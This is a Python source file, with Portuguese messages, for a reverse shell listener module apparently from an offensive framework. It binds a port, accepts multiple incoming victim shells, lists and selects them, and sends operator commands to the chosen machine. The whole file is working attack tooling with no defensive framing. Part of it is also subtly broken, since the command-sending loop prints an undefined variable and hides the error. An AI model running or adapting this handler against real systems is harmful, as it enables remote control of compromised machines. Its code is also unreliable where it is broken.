import socket
import sys
from queue import Queue
import threading
import time

class MikModule:
    description = "Um módulo para conexão de shell reverso"
    options = {
        "host": "Endereço do host",
        "port": "Porta para escutar conexões"
    }

    def __init__(self, options):
        self.host = options.get("host", "")
        self.port = int(options.get("port", 4444))
        self.server_socket = None
        self.connected_connections = []
        self.connected_addresses = []
        self.previous_command = None

    def create_socket(self):
        self.server_socket = socket.socket()
        print('[+] Socket criado com sucesso!\n')

    def bind_socket(self):
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            print(f'[+] Socket vinculado com sucesso ao host {self.host} na porta {self.port}!\n')
            print('[+] Servidor está escutando conexões...')
        except socket.error as msg:
            print(f'[!] Falha ao vincular o socket: {str(msg)}\n')

    def recv_commands(self, client_socket):
        while True:
            try:
                client_response = str(client_socket.recv(2048), 'utf-8')
                if client_response:
                    print(f"{client_socket}: {client_response}")
                else:
                    print(f"Cliente desconectado.")
                    break
            except:
                print('[-] Erro ao receber comando')
                break

    
    def accept_connections(self):
        while True:
            client_socket, client_address = self.server_socket.accept()
            self.server_socket.setblocking(1)
            self.connected_connections.append(client_socket)
            self.connected_addresses.append(client_address)
            print('[+] Servidor conectado com sucesso a', client_address[0])
            recv_thread = threading.Thread(target=self.recv_commands, args=(client_socket,))
            recv_thread.daemon = True
            recv_thread.start()
            
    def list_connections(self):
        print("Active Connections:")
        for i, client_address in enumerate(self.connected_addresses):
            print(f"  {i} - {client_address[0]}:{client_address[1]}")

    def get_target_connection(self, server_command):
        try:
            target_connection = int(server_command.replace('select ', ''))
            your_connection = self.connected_connections[target_connection]
            print('[+] Conectado a:', str(self.connected_addresses[target_connection][0]), 'na porta:',
                  str(self.connected_addresses[target_connection][1]))
            print(str(self.connected_addresses[target_connection][0]) + '> ', end='')
            return your_connection
        except:
            print('[+] Erro de conexão')
            return None

    def send_commands(self, your_connection):
        while True:
            try:
                server_input = input('cmd> ')
                if server_input == 'background':
                    break
                if len(str.encode(server_input)) > 0:
                    your_connection.send(str.encode(server_input))
                    print(client_response)
            except:
                print('[-] Erro ao enviar comandos')
                break

    def check_connections(self):
        while True:
            time.sleep(5)  # Verifica a cada 5 segundos
            for i, conn in enumerate(self.connected_connections):
                try:
                    conn.send(b"")
                except Exception as e:
                    print(f"[-] Cliente {self.connected_addresses[i][0]} desconectado.")
                    conn.close()
                    del self.connected_connections[i]
                    del self.connected_addresses[i]
                    break

    def run(self):
        self.create_socket()
        self.bind_socket()
        thread1 = threading.Thread(target=self.accept_connections)
        thread1.daemon = True
        thread1.start()
        print('[+] Thread 1 iniciada - Aceitando conexões')

        thread2 = threading.Thread(target=self.check_connections)
        thread2.daemon = True
        thread2.start()
        print('[+] Thread 2 iniciada - Verificando conexões')

        while True:
            server_command = input('nous> ')
            if server_command.lower() == 'help':
                self.help()
            elif server_command.lower() == 'list':
                self.list_connections()
            elif 'select' in server_command:
                your_connection = self.get_target_connection(server_command)
                if your_connection is not None:
                    self.send_commands(your_connection)
                else:
                    print(server_command[7:], ' comando não existe')
            elif server_command.lower() == 'background':
                if self.previous_command:
                    self.run_command(self.previous_command)
                else:
                    print("Nenhum comando anterior para retornar.")
            else:
                self.previous_command = server_command

    def help(self):
        print("Comandos disponíveis:")
        print("  list - Listar conexões ativas")
        print("  select <número> - Selecionar uma conexão pelo número")
        print("  quit - Sair do programa")
        print("  background - Voltar ao estado anterior")

    def run_command(self, command):
        if command.lower() == 'list':
            self.list_connections()
        elif 'select' in command:
            self.get_target_connection(command)

if __name__ == "__main__":
    options = {
        "host": input("Informe o endereço do host: "),
        "port": input("Informe a porta para escutar conexões: ")
    }
    Mik_module = MikModule(options)
    Mik_module.run()
